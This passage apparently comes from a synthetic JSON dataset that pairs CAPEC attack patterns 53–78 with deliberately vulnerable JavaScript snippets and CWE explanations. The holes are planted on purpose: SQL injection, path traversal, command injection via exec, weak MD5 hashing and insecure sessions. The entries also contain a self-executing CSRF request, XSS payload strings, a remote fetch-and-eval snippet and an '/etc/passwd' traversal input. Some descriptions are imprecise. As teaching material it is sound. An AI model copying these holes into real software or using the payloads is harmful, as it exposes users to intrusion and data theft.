        "description": "This JavaScript code snippet demonstrates a vulnerability related to embedding null bytes (CAPEC-Embeddings NULL Bytes). The `readFile` function attempts to read a file using the `fs.readFile` method. However, it does not properly handle null bytes in the filename input. If an attacker provides a filename with an embedded null byte (e.g., 'example.txt\\0hidden.txt'), the function may incorrectly interpret the filename, potentially leading to security issues. The code includes a basic check to throw an error if a null byte is detected in the filename, but this check is not comprehensive and serves to illustrate the vulnerability. This example highlights CWE-158 (Improper Neutralization of Null Byte or NUL Character) and CWE-20 (Improper Input Validation) by showing how improper handling of null bytes can lead to unexpected behavior."
    },
    {
        "capec_id": "53",
        "capec_name": "Postfix, Null Terminate, and Backslash",
        "code_snippet": "function validateInput(input) {\n  // Check if the input ends with a slash\n  if (input.endsWith('/')) {\n    // Remove the trailing slash for further processing\n    input = input.slice(0, -1);\n  }\n  // Check for null byte in the input\n  if (input.includes('\\0')) {\n    throw new Error('Invalid input: contains null byte');\n  }\n  // Further processing of the input\n  console.log('Processed input:', input);\n}\n\n// Example usage\ntry {\n  validateInput('example\\0/');\n} catch (e) {\n  console.error(e.message);\n}",
        "description": "This JavaScript code snippet demonstrates a potential vulnerability related to the 'Postfix, Null Terminate, and Backslash' CAPEC. The function `validateInput` checks if the input string ends with a slash and removes it for further processing. It also checks for the presence of a null byte (`\\0`) within the input. If a null byte is found, an error is thrown. This code aims to highlight the importance of proper input validation and neutralization of special characters, such as null bytes, to prevent security issues. The example usage shows how an input containing a null byte and a trailing slash can bypass initial checks if not properly handled."
    },
    {
        "capec_id": "54",
        "capec_name": "Query System for Information",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst mysql = require('mysql');\n\nconst db = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password',\n  database: 'test_db'\n});\n\ndb.connect((err) => {\n  if (err) throw err;\n  console.log('Connected to database');\n});\n\napp.get('/search', (req, res) => {\n  const searchTerm = req.query.q;\n  const query = `SELECT * FROM users WHERE name = '${searchTerm}'`;\n  db.query(query, (err, results) => {\n    if (err) {\n      res.status(500).send(`Error: ${err.message}`);\n    } else {\n      res.json(results);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a vulnerable web application using Express.js and MySQL. The application exposes a `/search` endpoint that takes a query parameter `q` and uses it to search for users in the database. The code is vulnerable to SQL Injection (CWE-89) because it directly incorporates user input into the SQL query without proper sanitization. Additionally, it uses the GET request method to include sensitive information in the query string (CWE-598) and generates error messages that may contain sensitive information (CWE-209). This snippet embodies the main idea of CAPEC-166, where an adversary can probe the application's structure and robustness by submitting crafted queries to extract sensitive information or exploit vulnerabilities."
    },
    {
        "capec_id": "55",
        "capec_name": "Rainbow Table Password Cracking",
        "code_snippet": "const crypto = require('crypto');\n\n// Weak password hashing function\nfunction hashPassword(password) {\n  return crypto.createHash('md5').update(password).digest('hex');\n}\n\n// Simulated database of user passwords (hashed)\nconst userDatabase = {\n  'user1': hashPassword('password123'),\n  'user2': hashPassword('123456'),\n  'user3': hashPassword('letmein')\n};\n\n// Function to simulate an attacker using a rainbow table\nfunction rainbowTableAttack(hash) {\n  const rainbowTable = {\n    '482c811da5d5b4bc6d497ffa98491e38': 'password123',\n    'e10adc3949ba59abbe56e057f20f883e': '123456',\n    '0d107d09f5bbe40cade3de5c71e9e9b7': 'letmein'\n  };\n  return rainbowTable[hash] || 'Password not found';\n}\n\n// Simulate an attacker trying to crack user passwords\nfor (const user in userDatabase) {\n  const hash = userDatabase[user];\n  const crackedPassword = rainbowTableAttack(hash);\n  console.log(`User: ${user}, Cracked Password: ${crackedPassword}`);\n}",
        "description": "This JavaScript code snippet demonstrates a weak password hashing mechanism using MD5, which is vulnerable to rainbow table attacks. The `hashPassword` function hashes passwords using MD5, a weak hashing algorithm (CWE-916). The `userDatabase` object simulates a database of users with their hashed passwords. The `rainbowTableAttack` function simulates an attacker using a precomputed rainbow table to crack the hashed passwords. The code iterates over the user database and attempts to crack each password using the rainbow table, highlighting the vulnerability of using weak password hashing and insufficient computational effort in password protection."
    },
    {
        "capec_id": "56",
        "capec_name": "DEPRECATED: Removing/short-circuiting 'guard logic'",
        "code_snippet": "function authenticateUser(token) {\n  // Client-side token validation (CWE-602)\n  if (token === 'valid-token') {\n    return true;\n  }\n  return false;\n}\n\nfunction accessProtectedResource(token) {\n  if (authenticateUser(token)) {\n    console.log('Access granted to protected resource.');\n  } else {\n    console.log('Access denied.');\n  }\n}\n\n// Simulating a capture-replay attack (CWE-294)\nconst capturedToken = 'valid-token';\naccessProtectedResource(capturedToken);",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of client-side authentication and access control. The `authenticateUser` function checks if a provided token matches a hardcoded 'valid-token' string, representing a flawed client-side enforcement of server-side security (CWE-602). The `accessProtectedResource` function grants or denies access based on the result of `authenticateUser`. The code also simulates a capture-replay attack (CWE-294) by using a captured token to gain unauthorized access to a protected resource. This embodies the main idea of the deprecated CAPEC pattern, which involves removing or short-circuiting guard logic, leading to authentication bypass and protection mechanism failure (CWE-693)."
    },
    {
        "capec_id": "57",
        "capec_name": "Utilizing REST's Trust in the System Resource to Obtain Sensitive Data",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst https = require('https');\nconst fs = require('fs');\n\n// SSL termination\nconst options = {\n  key: fs.readFileSync('server.key'),\n  cert: fs.readFileSync('server.cert')\n};\n\napp.get('/sensitive-data', (req, res) => {\n  // CWE-598: Sensitive data in query string\n  const sensitiveData = req.query.token;\n\n  // CWE-287: Improper Authentication\n  if (!sensitiveData || sensitiveData !== 'expectedToken') {\n    return res.status(401).send('Unauthorized');\n  }\n\n  // CWE-642: External Control of Critical State Data\n  const userData = { userId: req.query.userId, data: 'Sensitive Information' };\n\n  res.json(userData);\n});\n\nhttps.createServer(options, app).listen(443, () => {\n  console.log('Server is running on port 443');\n});",
        "description": "This JavaScript code snippet sets up an Express server with SSL termination, which is a common setup for RESTful applications. The server has an endpoint '/sensitive-data' that processes GET requests containing sensitive data in the query string (CWE-598). The code attempts to authenticate the request using a token, but the authentication mechanism is weak and easily bypassed (CWE-287). Additionally, the server stores and returns security-critical state information (user data) based on the query parameters, which can be controlled by an external actor (CWE-642). This setup demonstrates how a RESTful application can trust system resources and environment, leading to potential exposure of sensitive data once SSL is terminated, aligning with the CAPEC description."
    },
    {
        "capec_id": "58",
        "capec_name": "Restful Privilege Elevation",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Dummy user data\nconst users = [\n  { id: 1, name: 'Alice', role: 'user' },\n  { id: 2, name: 'Bob', role: 'admin' }\n];\n\n// Dummy data\nlet data = [\n  { id: 1, content: 'Public Data' },\n  { id: 2, content: 'Sensitive Data' }\n];\n\n// Middleware to simulate user authentication\napp.use((req, res, next) => {\n  req.user = users[0]; // Simulate Alice being logged in\n  next();\n});\n\n// Vulnerable endpoint\napp.get('/data/:id', (req, res) => {\n  const dataId = parseInt(req.params.id);\n  const item = data.find(d => d.id === dataId);\n  if (item) {\n    res.json(item);\n  } else {\n    res.status(404).send('Data not found');\n  }\n});\n\n// Start the server\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This code snippet demonstrates a RESTful API implemented using Express.js, which contains a vulnerability related to 'Restful Privilege Elevation' (CAPEC-267). The endpoint '/data/:id' allows any authenticated user to access data without proper authorization checks. In this example, the user 'Alice' with a 'user' role can access sensitive data that should be restricted to 'admin' users. This embodies CWE-285 (Improper Authorization) and CWE-650 (Trusting HTTP Permission Methods on the Server Side), as the server incorrectly assumes that a GET request does not need strict access control, potentially exposing sensitive information."
    },
    {
        "capec_id": "59",
        "capec_name": "Session Credential Falsification through Prediction",
        "code_snippet": "const express = require('express');\nconst crypto = require('crypto');\nconst app = express();\n\n// Vulnerable session ID generation\nfunction generateSessionID() {\n  return Math.floor(Math.random() * 1000000).toString(); // CWE-330: Use of Insufficiently Random Values\n}\n\napp.use((req, res, next) => {\n  if (!req.cookies.sessionID) {\n    const sessionID = generateSessionID();\n    res.cookie('sessionID', sessionID, { httpOnly: true, secure: true }); // CWE-539: Use of Persistent Cookies Containing Sensitive Information\n  }\n  next();\n});\n\napp.get('/login', (req, res) => {\n  const { username, password } = req.query;\n  // Simplified authentication check (CWE-285: Improper Authorization)\n  if (username === 'admin' && password === 'password') {\n    res.send('Logged in!');\n  } else {\n    res.send('Invalid credentials');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable session management implementation using Express.js. The `generateSessionID` function creates a session ID using a predictable random number generator (CWE-330: Use of Insufficiently Random Values), making it susceptible to prediction attacks. The session ID is stored in a persistent cookie (CWE-539: Use of Persistent Cookies Containing Sensitive Information), which can be exploited if intercepted. The login endpoint performs a simplified authentication check without proper authorization mechanisms (CWE-285: Improper Authorization). This code embodies the main idea of CAPEC-139: Session Credential Falsification through Prediction, by illustrating how predictable session IDs can lead to session hijacking and spoofing attacks."
    },
    {
        "capec_id": "60",
        "capec_name": "Reusing Session IDs (aka Session Replay)",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst session = require('express-session');\n\napp.use(session({\n  secret: 'secret-key',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { secure: false } // CWE-539: Use of Persistent Cookies Containing Sensitive Information\n}));\n\napp.post('/login', (req, res) => {\n  // Simulate user authentication\n  req.session.userId = 'user123'; // CWE-384: Session Fixation\n  res.send('Logged in');\n});\n\napp.get('/dashboard', (req, res) => {\n  if (!req.session.userId) {\n    return res.status(401).send('Unauthorized'); // CWE-285: Improper Authorization\n  }\n  res.send('Welcome to your dashboard');\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web application with session management. The session is configured with a secret key and a non-secure cookie, which is a vulnerability (CWE-539). The '/login' endpoint simulates user authentication and assigns a session ID without invalidating any existing session (CWE-384). The '/dashboard' endpoint checks for the presence of a session ID to authorize access, but this check is insufficient and can be bypassed (CWE-285). This setup allows for session replay attacks, where an attacker can reuse a stolen session ID to gain unauthorized access, embodying the main idea of CAPEC-139: Reusing Session IDs (aka Session Replay)."
    },
    {
        "capec_id": "61",
        "capec_name": "Session Fixation",
        "code_snippet": "const express = require('express');\nconst session = require('express-session');\nconst app = express();\n\napp.use(session({\n  secret: 'secret-key',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { secure: false }\n}));\n\napp.get('/login', (req, res) => {\n  // Simulate user login\n  req.session.user = 'authenticatedUser';\n  res.send('User logged in');\n});\n\napp.get('/dashboard', (req, res) => {\n  if (req.session.user) {\n    res.send('Welcome to your dashboard');\n  } else {\n    res.send('Please log in first');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web application with session management. The session is initialized with a fixed secret key and does not invalidate the session identifier upon user authentication. This embodies the main idea of the CAPEC 'Session Fixation' by allowing an attacker to provide a session identifier to the client, which remains valid even after the user logs in. The attacker can then use this session identifier to access privileged information. The code also reflects related CWEs such as 'Improper Control of a Resource Through its Lifetime' (CWE-664) by not properly managing the session lifecycle, and 'Client-Side Enforcement of Server-Side Security' (CWE-602) by relying on the client to maintain session state."
    },
    {
        "capec_id": "62",
        "capec_name": "Cross Site Request Forgery",
        "code_snippet": "function performCSRF() {\n    var img = new Image();\n    img.src = 'https://victim-website.com/transfer?amount=1000&to=attacker-account';\n}\n\n// Automatically execute the CSRF attack when the script is loaded\nperformCSRF();",
        "description": "This JavaScript code snippet demonstrates a basic Cross-Site Request Forgery (CSRF) attack. The function 'performCSRF' creates a new Image object and sets its 'src' attribute to a URL that performs a sensitive action on a victim's website, such as transferring money to an attacker's account. When the script is loaded, the 'performCSRF' function is automatically executed, causing the browser to send a request to the victim's website with the user's session cookies. This request is processed with the user's privilege level, potentially leading to unauthorized actions. The code embodies the main idea of CAPEC-352 by exploiting the implicit trust placed in user session cookies and the lack of sufficient request verification. It also touches on related CWEs such as missing authentication for critical functions (CWE-306) and improper control of resources (CWE-664)."
    },
    {
        "capec_id": "63",
        "capec_name": "Cross-Site Scripting (XSS)",
        "code_snippet": "<!DOCTYPE html>\n<html>\n<body>\n\n<h2>Comment Section</h2>\n<form action=\"/submit_comment\" method=\"post\">\n  <label for=\"comment\">Comment:</label><br><br>\n  <textarea id=\"comment\" name=\"comment\"></textarea><br><br>\n  <input type=\"submit\" value=\"Submit\">\n</form>\n\n<div id=\"comments\">\n  <!-- User comments will be inserted here -->\n</div>\n\n<script>\n  // Simulate fetching user comments from the server\n  var userComments = [\n    \"<script>alert('XSS Attack!');</script>\",\n    \"<img src='invalid.jpg' onerror='alert(\\\"XSS via IMG\\\")'>\"\n  ];\n\n  var commentsDiv = document.getElementById('comments');\n  userComments.forEach(function(comment) {\n    // Directly inserting user input without proper neutralization\n    commentsDiv.innerHTML += '<p>' + comment + '</p>';\n  });\n</script>\n\n</body>\n</html>",
        "description": "This code snippet represents a simple web page with a comment section where users can submit comments. The comments are then displayed on the page. The script simulates fetching user comments from a server and directly inserts them into the HTML without proper neutralization. This demonstrates the vulnerability to Cross-Site Scripting (XSS) attacks, as malicious scripts embedded in user comments are executed by the browser. The code highlights the risks associated with improper input validation (CWE-20), improper neutralization of input during web page generation (CWE-79), and improper neutralization of script in attributes of IMG tags (CWE-82)."
    },
    {
        "capec_id": "64",
        "capec_name": "Using Slashes and URL Encoding Combined to Bypass Validation Logic",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  let parsedUrl = url.parse(req.url, true);\n  let pathname = decodeURIComponent(parsedUrl.pathname);\n\n  // Vulnerable path validation\n  if (pathname.includes('../')) {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Access Denied');\n    return;\n  }\n\n  // Simulate file access\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end('Access Granted to ' + pathname);\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that parses incoming URL requests. It decodes the URL path using `decodeURIComponent` and checks if the path contains '../', which is a common pattern for directory traversal attacks. If such a pattern is detected, it denies access. However, this validation is vulnerable because it does not account for multiple encodings or alternate encodings that could bypass the check. For example, an attacker could use double encoding or other encoding schemes to represent '../' in a way that bypasses the validation logic. This snippet embodies the main idea of CAPEC-147, demonstrating how improper handling of URL encoding and path validation can lead to security vulnerabilities such as path traversal (CWE-22) and improper input validation (CWE-20)."
    },
    {
        "capec_id": "65",
        "capec_name": "Sniff Application Code",
        "code_snippet": "const http = require('http');\n\nhttp.get('http://example.com/update.js', (res) => {\n  let data = '';\n\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n\n  res.on('end', () => {\n    eval(data); // Execute the downloaded code\n  });\n}).on('error', (err) => {\n  console.error('Error: ' + err.message);\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable scenario where an application downloads and executes code from a remote server without verifying its integrity or using encryption. The `http.get` method fetches a JavaScript file from 'http://example.com/update.js' in cleartext, making it susceptible to sniffing attacks (CWE-319, CWE-311). The downloaded code is then executed using `eval`, which can lead to the execution of malicious code if the download is intercepted and altered (CWE-494). This snippet embodies the main idea of the CAPEC by showing how an adversary could capture and exploit application code transmitted over an insecure channel."
    },
    {
        "capec_id": "66",
        "capec_name": "SQL Injection",
        "code_snippet": "const express = require('express');\nconst mysql = require('mysql');\nconst app = express();\nconst connection = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password',\n  database: 'test_db'\n});\n\napp.use(express.json());\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;\n\n  connection.query(query, (error, results) => {\n    if (error) {\n      res.status(500).send('Internal Server Error');\n      return;\n    }\n    if (results.length > 0) {\n      res.send('Login successful');\n    } else {\n      res.send('Invalid credentials');\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a basic Express.js application that connects to a MySQL database and handles user login. The code constructs an SQL query using user input directly, which is a classic example of SQL Injection vulnerability (CWE-89). The input is not validated for syntactic correctness (CWE-1286), and special characters in the input are not neutralized, allowing an attacker to manipulate the SQL query. Additionally, the error handling is generic and does not expose sensitive information (CWE-209). This snippet embodies the main idea of SQL Injection as described in the CAPEC."
    },
    {
        "capec_id": "67",
        "capec_name": "String Format Overflow in syslog()",
        "code_snippet": "const syslog = require('syslog-client');\n\nfunction logMessage(userInput) {\n  const client = syslog.createClient('localhost');\n  // Vulnerable code: directly using user input in the format string\n  client.log(userInput, {facility: syslog.Facility.Local0, severity: syslog.Severity.Informational}, (error) => {\n    if (error) {\n      console.error('Error logging message:', error);\n    }\n  });\n}\n\n// Example usage\nlogMessage('%x %x %x %x');",
        "description": "This JavaScript code snippet demonstrates a vulnerable use of the syslog() function, where user input is directly used as the format string. The `logMessage` function takes user input and logs it using the syslog client. If the user input contains format specifiers (e.g., '%x'), it can lead to a format string injection attack, potentially causing a buffer overflow. This example embodies the main idea of the CAPEC by showing how improper handling of format strings can lead to security vulnerabilities. The related CWEs are represented by the lack of input validation (CWE-20), use of externally-controlled format strings (CWE-134), and potential for buffer overflow (CWE-120)."
    },
    {
        "capec_id": "68",
        "capec_name": "Subvert Code-signing Facilities",
        "code_snippet": "const crypto = require('crypto');\n\n// Weak hash function (CWE-328)\nfunction generateWeakHash(data) {\n  return crypto.createHash('md5').update(data).digest('hex');\n}\n\n// Simulate missing cryptographic step (CWE-325)\nfunction signCode(data, privateKey) {\n  const hash = generateWeakHash(data);\n  // Missing step: should encrypt the hash with the private key\n  return hash; // Incorrectly returning the hash directly\n}\n\n// Simulate subverting code-signing (CAPEC-243)\nfunction verifyCodeSignature(data, signature, publicKey) {\n  const expectedHash = generateWeakHash(data);\n  // Missing step: should decrypt the signature with the public key and compare\n  return expectedHash === signature; // Incorrectly comparing hashes directly\n}\n\n// Example usage\nconst data = 'Important code to be signed';\nconst privateKey = 'privateKey'; // Placeholder\nconst publicKey = 'publicKey'; // Placeholder\nconst signature = signCode(data, privateKey);\nconst isValid = verifyCodeSignature(data, signature, publicKey);\nconsole.log('Is the code signature valid?', isValid);",
        "description": "This JavaScript code snippet demonstrates a vulnerable code-signing mechanism. It uses a weak hash function (MD5) to generate a hash of the code (CWE-328). The `signCode` function simulates signing the code but omits a crucial cryptographic step (CWE-325) by not encrypting the hash with a private key. The `verifyCodeSignature` function simulates verifying the code signature but also omits a crucial step by not decrypting the signature with a public key. This subverts the code-signing facility (CAPEC-243), allowing an attacker to potentially forge signatures and escalate privileges."
    },
    {
        "capec_id": "69",
        "capec_name": "Target Programs with Elevated Privileges",
        "code_snippet": "const { exec } = require('child_process');\n\nfunction runCommand(userInput) {\n  // CWE-250: Execution with Unnecessary Privileges\n  if (process.getuid() !== 0) {\n    console.error('This script must be run as root!');\n    process.exit(1);\n  }\n\n  // CWE-78: Improper Neutralization of Special Elements used in an OS Command\n  exec(userInput, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Stdout: ${stdout}`);\n  });\n}\n\n// CWE-15: External Control of System or Configuration Setting\nconst userInput = process.argv[2];\nrunCommand(userInput);",
        "description": "This JavaScript code snippet demonstrates a vulnerable script that runs with elevated privileges (CWE-250) and executes OS commands based on user input (CWE-78). The script checks if it is running as root and exits if it is not (CWE-250). It then takes a command from user input (CWE-15) and executes it using the `exec` function from the `child_process` module without proper sanitization, making it susceptible to OS command injection (CWE-78). This represents the CAPEC idea of targeting programs with elevated privileges to execute arbitrary code."
    },
    {
        "capec_id": "70",
        "capec_name": "Try Common or Default Usernames and Passwords",
        "code_snippet": "const defaultCredentials = [\n  { username: 'admin', password: 'admin' },\n  { username: 'user', password: 'password' },\n  { username: 'root', password: 'root' }\n];\n\nfunction authenticate(username, password) {\n  for (let cred of defaultCredentials) {\n    if (cred.username === username && cred.password === password) {\n      console.log('Access Granted');\n      return true;\n    }\n  }\n  console.log('Access Denied');\n  return false;\n}\n\n// Example usage\nconst userInput = { username: 'admin', password: 'admin' };\nauthenticate(userInput.username, userInput.password);",
        "description": "This JavaScript code snippet demonstrates a simple authentication mechanism using a list of default credentials. The `defaultCredentials` array contains common username and password pairs that are often used as default credentials in many systems. The `authenticate` function checks if the provided username and password match any of the default credentials. If a match is found, it grants access; otherwise, it denies access. This code embodies the main idea of CAPEC-111, which highlights the risk of using common or default usernames and passwords. The related CWEs are represented by the use of weak password requirements (CWE-521), reliance on single-factor authentication (CWE-308), and the use of hard-coded credentials (CWE-798). The code serves as a cautionary example of poor security practices that can be exploited by attackers."
    },
    {
        "capec_id": "71",
        "capec_name": "Using Unicode Encoding to Bypass Validation Logic",
        "code_snippet": "function validateInput(input) {\n  // Early validation before canonicalization\n  if (/^[a-zA-Z0-9]+$/.test(input)) {\n    // Canonicalize input by decoding Unicode characters\n    let canonicalInput = decodeURIComponent(input);\n    // Further processing with canonicalized input\n    processInput(canonicalInput);\n  } else {\n    console.log('Invalid input');\n  }\n}\n\nfunction processInput(input) {\n  // Simulate processing the input\n  console.log('Processing input:', input);\n}\n\n// Example usage\nvalidateInput('%E2%9C%93'); // Unicode checkmark character",
        "description": "This JavaScript code snippet demonstrates a vulnerability where input validation is performed before canonicalization, which can be exploited using Unicode encoding to bypass validation logic. The `validateInput` function first checks if the input contains only alphanumeric characters using a regular expression. If the input passes this validation, it is then canonicalized by decoding any Unicode characters using `decodeURIComponent`. This order of operations can allow an attacker to bypass the validation by providing a Unicode-encoded string that appears valid before decoding but becomes malicious after decoding. The `processInput` function simulates further processing of the canonicalized input. The example usage shows how a Unicode checkmark character can bypass the initial validation."
    },
    {
        "capec_id": "72",
        "capec_name": "URL Encoding",
        "code_snippet": "const http = require('http');\nconst url = require('url');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  let parsedUrl = url.parse(req.url, true);\n  let filePath = decodeURIComponent(parsedUrl.query.file);\n\n  fs.readFile(filePath, 'utf8', (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.end('File not found');\n    } else {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end(data);\n    }\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that reads and serves files based on a URL parameter. The server parses the URL and decodes the 'file' query parameter using `decodeURIComponent`. This approach is vulnerable to several issues described in the CAPEC and related CWEs:\n\n1. **Improper Handling of URL Encoding (CWE-177)**: The code decodes the URL parameter without proper validation, which can lead to unexpected behavior if the input is maliciously crafted.\n2. **External Control of File Name or Path (CWE-73)**: The file path is directly influenced by user input, allowing an attacker to potentially access unauthorized files.\n3. **Improper Input Validation (CWE-20)**: There is no validation to ensure the 'file' parameter is safe and within expected boundaries, making the application susceptible to directory traversal attacks.\n\nThe code demonstrates how improper handling of URL encoding and lack of input validation can lead to security vulnerabilities."
    },
    {
        "capec_id": "73",
        "capec_name": "User-Controlled Filename",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst path = require('path');\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/upload', (req, res) => {\n  const userFilename = req.body.filename;\n  const sanitizedFilename = path.basename(userFilename); // CWE-20: Improper Input Validation\n\n  // CWE-116: Improper Encoding or Escaping of Output\n  res.send(`<a href=\"/uploads/${sanitizedFilename}\">Download your file</a>`);\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable Express.js application where a user can upload a file. The filename provided by the user is not properly sanitized, leading to potential XSS attacks. The `path.basename` function is used to sanitize the filename, but it is not sufficient to prevent all types of malicious input (CWE-20). The filename is then directly embedded into an HTML link without proper encoding or escaping (CWE-116), which can lead to XSS attacks if the filename contains malicious characters. This snippet embodies the main idea of the CAPEC by showing how user-controlled filenames can be exploited to execute malicious code in the client's browser."
    },
    {
        "capec_id": "74",
        "capec_name": "Manipulating State",
        "code_snippet": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\n// Insecurely storing sensitive information in a cookie\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (authenticate(username, password)) {\n    // CWE-315: Cleartext Storage of Sensitive Information in a Cookie\n    res.cookie('session', JSON.stringify({ username, role: 'user' }), { httpOnly: true });\n    res.send('Logged in');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\n// Manipulating state information\napp.get('/elevate', (req, res) => {\n  let session = JSON.parse(req.cookies.session);\n  if (session && session.username) {\n    // CWE-372: Incomplete Internal State Distinction\n    session.role = 'admin'; // Elevating privilege\n    res.cookie('session', JSON.stringify(session), { httpOnly: true });\n    res.send('Privilege elevated');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\nfunction authenticate(username, password) {\n  // Dummy authentication function\n  return username === 'user' && password === 'pass';\n}\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a web application using Express.js that is vulnerable to state manipulation attacks. The code insecurely stores sensitive information (username and role) in a cookie without encryption (CWE-315). An attacker can manipulate the state by modifying the cookie to elevate their privileges (CWE-372). The '/login' endpoint sets a session cookie with user information in cleartext, and the '/elevate' endpoint allows an attacker to change their role to 'admin' by manipulating the cookie, demonstrating the concept of manipulating state information as described in the CAPEC."
    },
    {
        "capec_id": "75",
        "capec_name": "Manipulating Writeable Configuration Files",
        "code_snippet": "const fs = require('fs');\nconst configFilePath = './config.json';\n\n// Read the configuration file\nlet configData = fs.readFileSync(configFilePath, 'utf8');\n\n// Parse the configuration data\nlet config;\ntry {\n  config = JSON.parse(configData);\n} catch (e) {\n  console.error('Invalid JSON format in configuration file');\n  process.exit(1);\n}\n\n// Use the configuration data\nconst dbConnection = `mysql://${config.dbUser}:${config.dbPassword}@${config.dbHost}/${config.dbName}`;\n\n// Execute a command using the configuration data\nconst exec = require('child_process').exec;\nexec(`mysql -u ${config.dbUser} -p${config.dbPassword} -h ${config.dbHost} ${config.dbName} < backup.sql`, (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.error(`stderr: ${stderr}`);\n});",
        "description": "This JavaScript code snippet demonstrates a potential vulnerability related to manipulating writable configuration files. The code reads a configuration file (config.json) and uses its contents to construct a database connection string and execute a command. The main idea of the CAPEC is represented by the fact that if an attacker can modify the configuration file, they can inject malicious data. The related CWEs are illustrated as follows:\n- CWE-349: The code accepts and processes untrusted data from the configuration file without validation.\n- CWE-99: The code uses input from the configuration file to construct a resource identifier (database connection string) without proper restrictions.\n- CWE-77: The code constructs a command using data from the configuration file, which could lead to command injection if the data is malicious.\n- CWE-346: The code does not validate the source of the configuration data.\n- CWE-353 and CWE-354: The code does not include or validate integrity checks for the configuration data, making it susceptible to tampering."
    },
    {
        "capec_id": "76",
        "capec_name": "Manipulating Web Input to File System Calls",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nhttp.createServer((req, res) => {\n  const filePath = path.join(__dirname, 'public', req.url);\n\n  fs.readFile(filePath, (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.write('404 Not Found');\n      res.end();\n    } else {\n      res.writeHead(200, {'Content-Type': 'text/html'});\n      res.write(data);\n      res.end();\n    }\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads files from the 'public' directory based on the URL requested by the user. However, it is vulnerable to path traversal attacks (CWE-22, CWE-23) because it directly uses the user-supplied URL to construct the file path without proper validation or sanitization. An attacker could manipulate the URL to access files outside the intended directory, potentially leading to unauthorized access or modification of the file system. This snippet embodies the main idea of CAPEC-176 by demonstrating how improper handling of web input can lead to file system access vulnerabilities."
    },
    {
        "capec_id": "77",
        "capec_name": "Manipulating User-Controlled Variables",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/updateSettings', (req, res) => {\n  // Vulnerable code: directly using user input to modify settings\n  const settings = req.body;\n  global.config = settings;\n  res.send('Settings updated');\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerability where user-controlled variables are used to modify application settings without proper validation or sanitization. The Express.js server listens for POST requests to the '/updateSettings' endpoint and directly assigns the user-provided input (req.body) to a global configuration object (global.config). This can lead to several security issues, such as external control of system settings (CWE-15), improper authorization (CWE-285), and potential code injection (CWE-94). The code represents the main idea of CAPEC-137, where an adversary can manipulate user-controlled variables to alter the application's behavior or business logic."
    },
    {
        "capec_id": "78",
        "capec_name": "Using Escaped Slashes in Alternate Encoding",
        "code_snippet": "const fs = require('fs');\n\nfunction readFile(filePath) {\n  // Validate input before canonicalization\n  if (!filePath || typeof filePath !== 'string') {\n    throw new Error('Invalid file path');\n  }\n\n  // Canonicalize the path\n  const canonicalPath = filePath.replace(/\\\\/g, '/');\n\n  // Validate the canonicalized path\n  if (canonicalPath.includes('..')) {\n    throw new Error('Path traversal attempt detected');\n  }\n\n  // Read the file\n  fs.readFile(canonicalPath, 'utf8', (err, data) => {\n    if (err) {\n      console.error('Error reading file:', err);\n      return;\n    }\n    console.log('File content:', data);\n  });\n}\n\n// Example usage\nreadFile('..\\\\etc\\\\passwd');",
